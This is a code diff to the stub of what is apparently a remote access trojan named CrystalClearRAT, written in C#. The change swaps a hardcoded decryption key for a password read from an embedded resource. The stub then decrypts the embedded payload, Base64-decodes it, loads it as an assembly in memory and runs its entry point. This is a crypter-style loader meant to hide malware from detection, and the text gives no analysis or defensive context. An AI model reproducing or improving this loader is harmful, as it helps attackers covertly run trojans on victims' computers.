@@ -17,13 +17,22 @@ namespace CrystalClearRAT.Stub
         {
 
             var assembly = Assembly.GetExecutingAssembly();
-            string resourceName = assembly.GetManifestResourceNames().Single(str => str.EndsWith("payload.txt"));
+            string payload = assembly.GetManifestResourceNames().Single(str => str.EndsWith("payload.txt"));
+            string password = assembly.GetManifestResourceNames().Single(str => str.EndsWith("password.txt"));
 
-            using (Stream stream = assembly.GetManifestResourceStream(resourceName))
+
+            using (Stream stream = assembly.GetManifestResourceStream(password))
+            using (StreamReader reader = new StreamReader(stream))
+            {
+                password = reader.ReadToEnd();
+            }
+
+
+            using (Stream stream = assembly.GetManifestResourceStream(payload))
             using (StreamReader reader = new StreamReader(stream))
             {
                 string result = reader.ReadToEnd();
-                byte[] code = Convert.FromBase64String(StringCipher.Decrypt(result, "123"));
+                byte[] code = Convert.FromBase64String(StringCipher.Decrypt(result, password));
 
                Assembly exeAssembly = Assembly.Load(code);
                 exeAssembly.EntryPoint.Invoke(null, null);
